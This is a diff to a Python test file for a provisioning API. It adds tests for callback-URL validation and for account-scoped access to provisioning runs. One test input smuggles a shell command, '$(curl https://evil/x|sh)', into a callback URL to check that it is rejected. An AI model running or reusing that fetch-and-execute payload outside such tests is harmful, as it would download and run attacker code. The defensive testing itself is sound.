@@ -59,6 +59,9 @@ def _secret_settings(**overrides):
         "github_dispatch_token": "",
         "provisioning_callback_key_id": "",
         "provisioning_callback_key_hash": "",
+        "provisioning_callback_allowed_hosts": "",
+        "is_operator_surface": True,
+        "operator_mode": False,
     }
     data.update(overrides)
     return SimpleNamespace(**data)
@@ -511,6 +514,10 @@ def test_retry_rejects_non_failed_provisioning_run(monkeypatch):
         payload={"dry_run": True},
     )
     monkeypatch.setattr(provisioning_router, "get_provisioning_run_store", lambda: runs)
+    # Mission Control operator context, so run-account scoping is bypassed and we
+    # reach the status guard under test.
+    monkeypatch.setattr(provisioning_router, "get_settings",
+                        lambda: SimpleNamespace(is_operator_surface=True, operator_mode=True))
 
     with pytest.raises(HTTPException) as exc:
         provisioning_router.retry_provisioning_run(run.id, principal=_principal("admin"))
@@ -570,3 +577,45 @@ def test_provision_create_accepts_legitimate_values():
     )
     assert ok.customer_name == "O'Brien Gym & Co"
     assert ok.module_versions["communication-api"] == "1.2.0"
+
+
+def test_callback_url_rejects_shell_metacharacters(monkeypatch):
+    platform, control = _stores()
+    monkeypatch.setattr(provisioning_router, "get_platform_store", lambda: platform)
+    monkeypatch.setattr(provisioning_router, "get_control_plane_store", lambda: control)
+    monkeypatch.setattr(provisioning_router, "get_service_key_store", lambda: MemoryServiceKeyStore())
+    monkeypatch.setattr(provisioning_router, "get_provisioning_run_store", lambda: MemoryProvisioningRunStore())
+    monkeypatch.setattr(provisioning_router, "get_settings", lambda: _secret_settings())
+
+    with pytest.raises(HTTPException) as exc:
+        provisioning_router.provision_customer(
+            provisioning_router.CustomerProvisionCreate(
+                customer_name="Acme", account_id="acme", deployment_id="dep_acme",
+                external_provisioning=True,
+                callback_url="https://cb.allowed.host/x?a=$(curl https://evil/x|sh)",
+            ),
+            principal=_principal("admin"),
+        )
+    assert exc.value.status_code == 400
+
+
+def test_run_reads_reject_non_owning_admin(monkeypatch):
+    platform, control = _stores()
+    from app.platform.base import Account
+    platform.create_account(Account(id="acme", kind="organization", name="Acme", owner_user_id="someone_else@x"))
+    runs = MemoryProvisioningRunStore()
+    run = create_run(runs, account_id="acme", deployment_id="dep_acme", bundle_id="onebrain_only",
+                     requested_by="someone_else@x", payload={"dry_run": True})
+    monkeypatch.setattr(provisioning_router, "get_provisioning_run_store", lambda: runs)
+    monkeypatch.setattr(provisioning_router, "get_platform_store", lambda: platform)
+    monkeypatch.setattr(provisioning_router, "get_settings",
+                        lambda: SimpleNamespace(is_operator_surface=True, operator_mode=False))
+    outsider = _principal("admin")  # admin@onebrain, does not administer acme
+
+    for call in (
+        lambda: provisioning_router.get_provisioning_run(run.id, principal=outsider),
+        lambda: provisioning_router.retry_provisioning_run(run.id, principal=outsider),
+    ):
+        with pytest.raises(HTTPException) as ei:
+            call()
+        assert ei.value.status_code == 404
